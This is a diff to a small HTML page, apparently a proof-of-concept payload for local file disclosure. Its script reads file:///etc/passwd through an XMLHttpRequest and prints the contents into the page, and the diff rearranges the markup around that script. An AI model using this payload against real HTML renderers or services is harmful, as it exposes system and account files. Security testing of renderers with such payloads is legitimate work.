@@ -1,7 +1,5 @@
 <html>
-<body>
-<h1>Response</h1>
-<div id="response"></div>
+<head>
 
 <script>
 var d = document.getElementById('response');
@@ -12,10 +10,13 @@ x.open("GET", "file:///etc/passwd", false);
 x.send();
 d.innerHTML = d.innerHTML + "\nLoaded.\n\n";
 d.innerHTML = d.innerHTML + "Response: " + x.statusText + " \n\n" + x.responseText;
-setTimeout(() => {
-  console.log("Delayed for 5 seconds.");
-}, "5000");
-
 </script>
+
+</head>
+
+  <body>
+<h1>Response</h1>
+<div id="response"></div>
+
 </body>
 </html>
